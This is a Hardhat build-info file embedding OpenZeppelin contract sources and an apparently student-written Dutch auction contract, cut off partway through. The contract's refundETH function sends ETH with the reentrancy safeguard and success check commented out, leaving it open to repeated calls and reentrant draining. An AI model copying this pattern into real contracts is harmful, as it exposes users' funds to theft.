{"id":"7ee655e8c6f0728601849c16790e2edb","_format":"hh-sol-build-info-1","solcVersion":"0.8.21","solcLongVersion":"0.8.21+commit.d9974bed","input":{"language":"Solidity","sources":{"@openzeppelin/contracts/access/Ownable.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (access/Ownable.sol)\n\npragma solidity ^0.8.20;\n\nimport {Context} from \"../utils/Context.sol\";\n\n/**\n * @dev Contract module which provides a basic access control mechanism, where\n * there is an account (an owner) that can be granted exclusive access to\n * specific functions.\n *\n * The initial owner is set to the address provided by the deployer. This can\n * later be changed with {transferOwnership}.\n *\n * This module is used through inheritance. It will make available the modifier\n * `onlyOwner`, which can be applied to your functions to restrict their use to\n * the owner.\n */\nabstract contract Ownable is Context {\n    address private _owner;\n\n    /**\n     * @dev The caller account is not authorized to perform an operation.\n     */\n    error OwnableUnauthorizedAccount(address account);\n\n    /**\n     * @dev The owner is not a valid owner account. (eg. `address(0)`)\n     */\n    error OwnableInvalidOwner(address owner);\n\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n\n    /**\n     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.\n     */\n    constructor(address initialOwner) {\n        if (initialOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(initialOwner);\n    }\n\n    /**\n     * @dev Throws if called by any account other than the owner.\n     */\n    modifier onlyOwner() {\n        _checkOwner();\n        _;\n    }\n\n    /**\n     * @dev Returns the address of the current owner.\n     */\n    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n    /**\n     * @dev Throws if the sender is not the owner.\n     */\n    function _checkOwner() internal view virtual {\n        if (owner() != _msgSender()) {\n            revert OwnableUnauthorizedAccount(_msgSender());\n        }\n    }\n\n    /**\n     * @dev Leaves the contract without owner. It will not be possible to call\n     * `onlyOwner` functions. Can only be called by the current owner.\n     *\n     * NOTE: Renouncing ownership will leave the contract without an owner,\n     * thereby disabling any functionality that is only available to the owner.\n     */\n    function renounceOwnership() public virtual onlyOwner {\n        _transferOwnership(address(0));\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Can only be called by the current owner.\n     */\n    function transferOwnership(address newOwner) public virtual onlyOwner {\n        if (newOwner == address(0)) {\n            revert OwnableInvalidOwner(address(0));\n        }\n        _transferOwnership(newOwner);\n    }\n\n    /**\n     * @dev Transfers ownership of the contract to a new account (`newOwner`).\n     * Internal function without access restriction.\n     */\n    function _transferOwnership(address newOwner) internal virtual {\n        address oldOwner = _owner;\n        _owner = newOwner;\n        emit OwnershipTransferred(oldOwner, newOwner);\n    }\n}\n"},"@openzeppelin/contracts/interfaces/draft-IERC6093.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (interfaces/draft-IERC6093.sol)\npragma solidity ^0.8.20;\n\n/**\n * @dev Standard ERC20 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens.\n */\ninterface IERC20Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientBalance(address sender, uint256 balance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC20InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC20InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     * @param allowance Amount of tokens a `spender` is allowed to operate with.\n     * @param needed Minimum amount required to perform a transfer.\n     */\n    error ERC20InsufficientAllowance(address spender, uint256 allowance, uint256 needed);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC20InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n     * @param spender Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC20InvalidSpender(address spender);\n}\n\n/**\n * @dev Standard ERC721 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens.\n */\ninterface IERC721Errors {\n    /**\n     * @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\n     * Used in balance queries.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721InvalidOwner(address owner);\n\n    /**\n     * @dev Indicates a `tokenId` whose `owner` is the zero address.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721NonexistentToken(uint256 tokenId);\n\n    /**\n     * @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param tokenId Identifier number of a token.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC721IncorrectOwner(address sender, uint256 tokenId, address owner);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC721InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC721InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC721InsufficientApproval(address operator, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC721InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC721InvalidOperator(address operator);\n}\n\n/**\n * @dev Standard ERC1155 Errors\n * Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens.\n */\ninterface IERC1155Errors {\n    /**\n     * @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     * @param balance Current balance for the interacting account.\n     * @param needed Minimum amount required to perform a transfer.\n     * @param tokenId Identifier number of a token.\n     */\n    error ERC1155InsufficientBalance(address sender, uint256 balance, uint256 needed, uint256 tokenId);\n\n    /**\n     * @dev Indicates a failure with the token `sender`. Used in transfers.\n     * @param sender Address whose tokens are being transferred.\n     */\n    error ERC1155InvalidSender(address sender);\n\n    /**\n     * @dev Indicates a failure with the token `receiver`. Used in transfers.\n     * @param receiver Address to which tokens are being transferred.\n     */\n    error ERC1155InvalidReceiver(address receiver);\n\n    /**\n     * @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     * @param owner Address of the current owner of a token.\n     */\n    error ERC1155MissingApprovalForAll(address operator, address owner);\n\n    /**\n     * @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n     * @param approver Address initiating an approval operation.\n     */\n    error ERC1155InvalidApprover(address approver);\n\n    /**\n     * @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n     * @param operator Address that may be allowed to operate on tokens without being their owner.\n     */\n    error ERC1155InvalidOperator(address operator);\n\n    /**\n     * @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n     * Used in batch transfers.\n     * @param idsLength Length of the array of token identifiers\n     * @param valuesLength Length of the array of token amounts\n     */\n    error ERC1155InvalidArrayLength(uint256 idsLength, uint256 valuesLength);\n}\n"},"@openzeppelin/contracts/token/ERC20/ERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/ERC20.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"./IERC20.sol\";\nimport {IERC20Metadata} from \"./extensions/IERC20Metadata.sol\";\nimport {Context} from \"../../utils/Context.sol\";\nimport {IERC20Errors} from \"../../interfaces/draft-IERC6093.sol\";\n\n/**\n * @dev Implementation of the {IERC20} interface.\n *\n * This implementation is agnostic to the way tokens are created. This means\n * that a supply mechanism has to be added in a derived contract using {_mint}.\n *\n * TIP: For a detailed writeup see our guide\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\n * to implement supply mechanisms].\n *\n * The default value of {decimals} is 18. To change this, you should override\n * this function so it returns a different value.\n *\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\n * instead returning `false` on failure. This behavior is nonetheless\n * conventional and does not conflict with the expectations of ERC20\n * applications.\n *\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\n * This allows applications to reconstruct the allowance for all accounts just\n * by listening to said events. Other implementations of the EIP may not emit\n * these events, as it isn't required by the specification.\n */\nabstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {\n    mapping(address account => uint256) private _balances;\n\n    mapping(address account => mapping(address spender => uint256)) private _allowances;\n\n    uint256 private _totalSupply;\n\n    string private _name;\n    string private _symbol;\n\n    /**\n     * @dev Sets the values for {name} and {symbol}.\n     *\n     * All two of these values are immutable: they can only be set once during\n     * construction.\n     */\n    constructor(string memory name_, string memory symbol_) {\n        _name = name_;\n        _symbol = symbol_;\n    }\n\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() public view virtual returns (string memory) {\n        return _name;\n    }\n\n    /**\n     * @dev Returns the symbol of the token, usually a shorter version of the\n     * name.\n     */\n    function symbol() public view virtual returns (string memory) {\n        return _symbol;\n    }\n\n    /**\n     * @dev Returns the number of decimals used to get its user representation.\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\n     *\n     * Tokens usually opt for a value of 18, imitating the relationship between\n     * Ether and Wei. This is the default value returned by this function, unless\n     * it's overridden.\n     *\n     * NOTE: This information is only used for _display_ purposes: it in\n     * no way affects any of the arithmetic of the contract, including\n     * {IERC20-balanceOf} and {IERC20-transfer}.\n     */\n    function decimals() public view virtual returns (uint8) {\n        return 18;\n    }\n\n    /**\n     * @dev See {IERC20-totalSupply}.\n     */\n    function totalSupply() public view virtual returns (uint256) {\n        return _totalSupply;\n    }\n\n    /**\n     * @dev See {IERC20-balanceOf}.\n     */\n    function balanceOf(address account) public view virtual returns (uint256) {\n        return _balances[account];\n    }\n\n    /**\n     * @dev See {IERC20-transfer}.\n     *\n     * Requirements:\n     *\n     * - `to` cannot be the zero address.\n     * - the caller must have a balance of at least `value`.\n     */\n    function transfer(address to, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-allowance}.\n     */\n    function allowance(address owner, address spender) public view virtual returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n    /**\n     * @dev See {IERC20-approve}.\n     *\n     * NOTE: If `value` is the maximum `uint256`, the allowance is not updated on\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\n     *\n     * Requirements:\n     *\n     * - `spender` cannot be the zero address.\n     */\n    function approve(address spender, uint256 value) public virtual returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, value);\n        return true;\n    }\n\n    /**\n     * @dev See {IERC20-transferFrom}.\n     *\n     * Emits an {Approval} event indicating the updated allowance. This is not\n     * required by the EIP. See the note at the beginning of {ERC20}.\n     *\n     * NOTE: Does not update the allowance if the current allowance\n     * is the maximum `uint256`.\n     *\n     * Requirements:\n     *\n     * - `from` and `to` cannot be the zero address.\n     * - `from` must have a balance of at least `value`.\n     * - the caller must have allowance for ``from``'s tokens of at least\n     * `value`.\n     */\n    function transferFrom(address from, address to, uint256 value) public virtual returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, value);\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to`.\n     *\n     * This internal function is equivalent to {transfer}, and can be used to\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\n     *\n     * Emits a {Transfer} event.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _transfer(address from, address to, uint256 value) internal {\n        if (from == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        if (to == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(from, to, value);\n    }\n\n    /**\n     * @dev Transfers a `value` amount of tokens from `from` to `to`, or alternatively mints (or burns) if `from`\n     * (or `to`) is the zero address. All customizations to transfers, mints, and burns should be done by overriding\n     * this function.\n     *\n     * Emits a {Transfer} event.\n     */\n    function _update(address from, address to, uint256 value) internal virtual {\n        if (from == address(0)) {\n            // Overflow check required: The rest of the code assumes that totalSupply never overflows\n            _totalSupply += value;\n        } else {\n            uint256 fromBalance = _balances[from];\n            if (fromBalance < value) {\n                revert ERC20InsufficientBalance(from, fromBalance, value);\n            }\n            unchecked {\n                // Overflow not possible: value <= fromBalance <= totalSupply.\n                _balances[from] = fromBalance - value;\n            }\n        }\n\n        if (to == address(0)) {\n            unchecked {\n                // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.\n                _totalSupply -= value;\n            }\n        } else {\n            unchecked {\n                // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.\n                _balances[to] += value;\n            }\n        }\n\n        emit Transfer(from, to, value);\n    }\n\n    /**\n     * @dev Creates a `value` amount of tokens and assigns them to `account`, by transferring it from address(0).\n     * Relies on the `_update` mechanism\n     *\n     * Emits a {Transfer} event with `from` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead.\n     */\n    function _mint(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidReceiver(address(0));\n        }\n        _update(address(0), account, value);\n    }\n\n    /**\n     * @dev Destroys a `value` amount of tokens from `account`, lowering the total supply.\n     * Relies on the `_update` mechanism.\n     *\n     * Emits a {Transfer} event with `to` set to the zero address.\n     *\n     * NOTE: This function is not virtual, {_update} should be overridden instead\n     */\n    function _burn(address account, uint256 value) internal {\n        if (account == address(0)) {\n            revert ERC20InvalidSender(address(0));\n        }\n        _update(account, address(0), value);\n    }\n\n    /**\n     * @dev Sets `value` as the allowance of `spender` over the `owner` s tokens.\n     *\n     * This internal function is equivalent to `approve`, and can be used to\n     * e.g. set automatic allowances for certain subsystems, etc.\n     *\n     * Emits an {Approval} event.\n     *\n     * Requirements:\n     *\n     * - `owner` cannot be the zero address.\n     * - `spender` cannot be the zero address.\n     *\n     * Overrides to this logic should be done to the variant with an additional `bool emitEvent` argument.\n     */\n    function _approve(address owner, address spender, uint256 value) internal {\n        _approve(owner, spender, value, true);\n    }\n\n    /**\n     * @dev Variant of {_approve} with an optional flag to enable or disable the {Approval} event.\n     *\n     * By default (when calling {_approve}) the flag is set to true. On the other hand, approval changes made by\n     * `_spendAllowance` during the `transferFrom` operation set the flag to false. This saves gas by not emitting any\n     * `Approval` event during `transferFrom` operations.\n     *\n     * Anyone who wishes to continue emitting `Approval` events on the`transferFrom` operation can force the flag to\n     * true using the following override:\n     * ```\n     * function _approve(address owner, address spender, uint256 value, bool) internal virtual override {\n     *     super._approve(owner, spender, value, true);\n     * }\n     * ```\n     *\n     * Requirements are the same as {_approve}.\n     */\n    function _approve(address owner, address spender, uint256 value, bool emitEvent) internal virtual {\n        if (owner == address(0)) {\n            revert ERC20InvalidApprover(address(0));\n        }\n        if (spender == address(0)) {\n            revert ERC20InvalidSpender(address(0));\n        }\n        _allowances[owner][spender] = value;\n        if (emitEvent) {\n            emit Approval(owner, spender, value);\n        }\n    }\n\n    /**\n     * @dev Updates `owner` s allowance for `spender` based on spent `value`.\n     *\n     * Does not update the allowance value in case of infinite allowance.\n     * Revert if not enough allowance is available.\n     *\n     * Does not emit an {Approval} event.\n     */\n    function _spendAllowance(address owner, address spender, uint256 value) internal virtual {\n        uint256 currentAllowance = allowance(owner, spender);\n        if (currentAllowance != type(uint256).max) {\n            if (currentAllowance < value) {\n                revert ERC20InsufficientAllowance(spender, currentAllowance, value);\n            }\n            unchecked {\n                _approve(owner, spender, currentAllowance - value, false);\n            }\n        }\n    }\n}\n"},"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/extensions/IERC20Metadata.sol)\n\npragma solidity ^0.8.20;\n\nimport {IERC20} from \"../IERC20.sol\";\n\n/**\n * @dev Interface for the optional metadata functions from the ERC20 standard.\n */\ninterface IERC20Metadata is IERC20 {\n    /**\n     * @dev Returns the name of the token.\n     */\n    function name() external view returns (string memory);\n\n    /**\n     * @dev Returns the symbol of the token.\n     */\n    function symbol() external view returns (string memory);\n\n    /**\n     * @dev Returns the decimals places of the token.\n     */\n    function decimals() external view returns (uint8);\n}\n"},"@openzeppelin/contracts/token/ERC20/IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (token/ERC20/IERC20.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Interface of the ERC20 standard as defined in the EIP.\n */\ninterface IERC20 {\n    /**\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\n     * another (`to`).\n     *\n     * Note that `value` may be zero.\n     */\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /**\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\n     * a call to {approve}. `value` is the new allowance.\n     */\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    /**\n     * @dev Returns the value of tokens in existence.\n     */\n    function totalSupply() external view returns (uint256);\n\n    /**\n     * @dev Returns the value of tokens owned by `account`.\n     */\n    function balanceOf(address account) external view returns (uint256);\n\n    /**\n     * @dev Moves a `value` amount of tokens from the caller's account to `to`.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transfer(address to, uint256 value) external returns (bool);\n\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    /**\n     * @dev Sets a `value` amount of tokens as the allowance of `spender` over the\n     * caller's tokens.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\n     * that someone may use both the old and the new allowance by unfortunate\n     * transaction ordering. One possible solution to mitigate this race\n     * condition is to first reduce the spender's allowance to 0 and set the\n     * desired value afterwards:\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\n     *\n     * Emits an {Approval} event.\n     */\n    function approve(address spender, uint256 value) external returns (bool);\n\n    /**\n     * @dev Moves a `value` amount of tokens from `from` to `to` using the\n     * allowance mechanism. `value` is then deducted from the caller's\n     * allowance.\n     *\n     * Returns a boolean value indicating whether the operation succeeded.\n     *\n     * Emits a {Transfer} event.\n     */\n    function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n"},"@openzeppelin/contracts/utils/Context.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/Context.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Provides information about the current execution context, including the\n * sender of the transaction and its data. While these are generally available\n * via msg.sender and msg.data, they should not be accessed in such a direct\n * manner, since when dealing with meta-transactions the account sending and\n * paying for execution may not be the actual sender (as far as an application\n * is concerned).\n *\n * This contract is only required for intermediate, library-like contracts.\n */\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n"},"@openzeppelin/contracts/utils/ReentrancyGuard.sol":{"content":"// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.0.0) (utils/ReentrancyGuard.sol)\n\npragma solidity ^0.8.20;\n\n/**\n * @dev Contract module that helps prevent reentrant calls to a function.\n *\n * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier\n * available, which can be applied to functions to make sure there are no nested\n * (reentrant) calls to them.\n *\n * Note that because there is a single `nonReentrant` guard, functions marked as\n * `nonReentrant` may not call one another. This can be worked around by making\n * those functions `private`, and then adding `external` `nonReentrant` entry\n * points to them.\n *\n * TIP: If you would like to learn more about reentrancy and alternative ways\n * to protect against it, check out our blog post\n * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].\n */\nabstract contract ReentrancyGuard {\n    // Booleans are more expensive than uint256 or any type that takes up a full\n    // word because each write operation emits an extra SLOAD to first read the\n    // slot's contents, replace the bits taken up by the boolean, and then write\n    // back. This is the compiler's defense against contract upgrades and\n    // pointer aliasing, and it cannot be disabled.\n\n    // The values being non-zero value makes deployment a bit more expensive,\n    // but in exchange the refund on every call to nonReentrant will be lower in\n    // amount. Since refunds are capped to a percentage of the total\n    // transaction's gas, it is best to keep them low in cases like this one, to\n    // increase the likelihood of the full refund coming into effect.\n    uint256 private constant NOT_ENTERED = 1;\n    uint256 private constant ENTERED = 2;\n\n    uint256 private _status;\n\n    /**\n     * @dev Unauthorized reentrant call.\n     */\n    error ReentrancyGuardReentrantCall();\n\n    constructor() {\n        _status = NOT_ENTERED;\n    }\n\n    /**\n     * @dev Prevents a contract from calling itself, directly or indirectly.\n     * Calling a `nonReentrant` function from another `nonReentrant`\n     * function is not supported. It is possible to prevent this from happening\n     * by making the `nonReentrant` function external, and making it call a\n     * `private` function that does the actual work.\n     */\n    modifier nonReentrant() {\n        _nonReentrantBefore();\n        _;\n        _nonReentrantAfter();\n    }\n\n    function _nonReentrantBefore() private {\n        // On the first call to nonReentrant, _status will be NOT_ENTERED\n        if (_status == ENTERED) {\n            revert ReentrancyGuardReentrantCall();\n        }\n\n        // Any calls to nonReentrant after this point will fail\n        _status = ENTERED;\n    }\n\n    function _nonReentrantAfter() private {\n        // By storing the original value once again, a refund is triggered (see\n        // https://eips.ethereum.org/EIPS/eip-2200)\n        _status = NOT_ENTERED;\n    }\n\n    /**\n     * @dev Returns true if the reentrancy guard is currently set to \"entered\", which indicates there is a\n     * `nonReentrant` function in the call stack.\n     */\n    function _reentrancyGuardEntered() internal view returns (bool) {\n        return _status == ENTERED;\n    }\n}\n"},"contracts/Dutch_Auction.sol":{"content":"// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.21;\n\n// Using our own ERC20Token\nimport \"./ERC20Token.sol\";\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\n\nerror Dutch_Auction__NotOwner();\nerror Dutch_Auction__IsOwner();\nerror Dutch_Auction__NotOpen();\nerror Dutch_Auction__Open();\n\ncontract Dutch_Auction {\n    int256 private currentPrice; //in wei\n    uint256 private totalNumBidders = 0;\n    uint256 private immutable startPrice; //in wei\n    uint256 private immutable reservePrice;\n    address private immutable i_owner;\n    uint256 private totalAlgosAvailable;\n    uint256 private startTime;\n    uint256 private constant AUCTION_TIME = 1200; //in seconds\n    uint256 private currentUnsoldAlgos;\n    uint256 private changePerMin;\n    bool private prematureEnd = false;\n\n    ERC20Token private DAToken; //importing Token\n    address private ERC20ContractAddress;\n    mapping(uint256 => Bidder) public biddersList; //to be made private later <for debugging purposes>\n\n    struct Bidder {\n        uint256 bidderID;\n        address walletAddress;\n        uint256 bidValue; //the value they paid to the contract to purchase the algo\n        uint256 totalAlgosPurchased;\n        uint256 refundEth;\n        bool isExist;\n    }\n\n    // Variable to indicate auction's state --> type declaration\n    enum AuctionState {\n        OPEN,\n        CLOSING\n    } // uint256 0: OPEN, 1: CLOSED\n\n    AuctionState private s_auctionState;\n\n    /*Constructor*/\n    constructor(uint256 _reservePrice, uint256 _startPrice) payable {\n        require(\n            _reservePrice < _startPrice,\n            \"reserve price is higher than current price\"\n        );\n        i_owner = msg.sender;\n        reservePrice = _reservePrice;\n        currentPrice = int256(_startPrice);\n        startPrice = _startPrice;\n\n        s_auctionState = AuctionState.CLOSING;\n    }\n\n    /* modifiers */\n    modifier onlyOwner() {\n        // require(msg.sender == owner);\n        if (msg.sender != i_owner) revert Dutch_Auction__NotOwner();\n        _; //do the rest of the function\n    }\n\n    modifier notOwner() {\n        // require(msg.sender == owner);\n        if (msg.sender == i_owner) revert Dutch_Auction__IsOwner();\n        _; //do the rest of the function\n    }\n\n    modifier AuctionOpen() {\n        // require(msg.sender == owner);\n        if (AuctionState.CLOSING == s_auctionState)\n            revert Dutch_Auction__NotOpen();\n        _; //do the rest of the function\n    }\n\n    modifier AuctionClosed() {\n        // require(msg.sender == owner);\n        if (AuctionState.OPEN == s_auctionState) revert Dutch_Auction__Open();\n        _; //do the rest of the function\n    }\n\n    /***\n     * -------------------------------------------------------------------------------------\n     * -------------------------------------------------------------------------------------\n     * -------------------------------------------------------------------------------------\n     * -------------------------------------------------------------------------------------\n     * -------------------------------------------------------------------------------------\n     */\n\n    /** Events\n     *\n     */\n    event startAuctionEvent(\n        uint256 startTime,\n        address ERC20Address,\n        uint256 totalAlgosAvailable,\n        uint256 changePerMin\n    );\n    event addBidderEvent(\n        uint256 bidderID,\n        address walletAddress,\n        uint256 bidvalue\n    );\n    event updateCurrentPriceEvent(uint256 timeElapsed, uint256 currentprice);\n    event sendTokenEvent(address bidderAddress, uint256 tokensSent);\n    event calculateEvent(\n        address bidderAddress,\n        uint256 TokensPurchased,\n        uint256 refundValue\n    );\n\n    event RefundEvent(\n        address bidderAddress,\n        uint256 TokensPurchased,\n        uint256 refundValue\n    );\n\n    event endAuctionEvent(\n        uint256 totalBidders,\n        uint256 burntERC20,\n        uint totalETHEarned\n    );\n\n    function startAuction(\n        uint256 _totalAlgosAvailable,\n        uint256 _changePerMin\n    ) public onlyOwner AuctionClosed returns (address) {\n        s_auctionState = AuctionState.OPEN;\n        totalAlgosAvailable = _totalAlgosAvailable;\n        changePerMin = _changePerMin;\n        currentPrice = int256(startPrice);\n        currentUnsoldAlgos = _totalAlgosAvailable;\n        startTime = block.timestamp; //Start time of when the contract is deployed\n        DAToken = new ERC20Token(totalAlgosAvailable, address(this));\n        ERC20ContractAddress = address(DAToken);\n        emit startAuctionEvent(\n            startTime,\n            ERC20ContractAddress,\n            totalAlgosAvailable,\n            changePerMin\n        );\n        return ERC20ContractAddress;\n    }\n\n    /**\n     * public functions\n     *\n     * */\n\n    function addBidder() public payable notOwner AuctionOpen {\n        //checking all the requirements\n        require(msg.value > 0, \"bidValue less than 0\");\n        calculate();\n        require(block.timestamp - startTime < AUCTION_TIME, \"time is up\");\n        require(currentUnsoldAlgos > 0, \"There is no more algos left\");\n\n        // Adding or Updating the bidders currently in the contract\n        Bidder storage newBidder = biddersList[totalNumBidders];\n        newBidder.bidderID = totalNumBidders;\n        newBidder.walletAddress = msg.sender;\n        newBidder.bidValue = msg.value;\n        newBidder.isExist = true;\n        newBidder.totalAlgosPurchased = 0;\n        newBidder.refundEth = 0;\n        biddersList[totalNumBidders] = newBidder;\n        emit addBidderEvent(\n            newBidder.bidderID,\n            newBidder.walletAddress,\n            newBidder.bidValue\n        );\n        totalNumBidders++;\n        calculate(); //calculate again in case the tokens are run out \n    }\n\n    function updateCurrentPrice() public {\n        if (!prematureEnd){\n        currentPrice =\n            int256(startPrice) -\n            int256((block.timestamp - startTime) / 60) *\n            int256(changePerMin);\n\n        if (currentPrice <= 0 || currentPrice <= int256(reservePrice)) {\n            currentPrice = int256(reservePrice);\n        }\n        emit updateCurrentPriceEvent(\n            (block.timestamp - startTime),\n            uint256(currentPrice)\n        );\n        }\n    }\n\n    function sendTokens() public {\n        for (uint i = 0; i < totalNumBidders; i++) {\n            if (biddersList[i].totalAlgosPurchased > 0) {\n                DAToken.approve(\n                    biddersList[i].walletAddress,\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\n                );\n                DAToken.transferFrom(\n                    address(this),\n                    biddersList[i].walletAddress,\n                    biddersList[i].totalAlgosPurchased * 10 ** 18\n                );\n                emit sendTokenEvent(\n                    biddersList[i].walletAddress,\n                    biddersList[i].totalAlgosPurchased\n                );\n            }\n        }\n    }\n\n    function refundETH() public{\n        for (uint i = 0; i < totalNumBidders; i++) {\n            if (\n                biddersList[i].refundEth > 0 &&\n                address(this).balance > biddersList[i].refundEth && address(this).balance > 0\n            ) {\n                //refundETH\n                uint256 sendValue = biddersList[i].refundEth;\n                //biddersList[i].refundEth = 0; // re-entrancy attack prevention\n                (bool callSuccess, ) = payable(biddersList[i].walletAddress)\n                    .call{value: sendValue}(\"\");\n               // require(callSuccess, \"Failed to send ether\");\n                emit RefundEvent(\n                    biddersList[i].walletAddress,\n                    biddersList[i].totalAlgosPurchased,\n                    sendValue\n                );\n            }\n        }\n    }\n\n    function calculate() public {\n        updateCurrentPrice();\n        uint256 currentAlgos = totalAlgosAvailable;\n        for (uint i = 0; i < totalNumBidders; i++) {\n            //if there is sufficient algos for this current bidder\n            if (\n                currentAlgos >= biddersList[i].bidValue / uint256(currentPrice)\n            ) {\n                biddersList[i].totalAlgosPurchased =\n                    biddersList[i].bidValue /\n                    uint256(currentPrice);\n                currentAlgos -= biddersList[i].bidValue / uint256(currentPrice);\n                biddersList[i].refundEth = 0;\n            }\n            //Else if there is algos left but it is less than the amount the bidder bidded\n            // he gets all the remaining algos and is refunded the ETH.\n            else if (\n                currentAlgos > 0 &&\n                currentAlgos < biddersList[i].bidValue / uint256(currentPrice)\n            ) 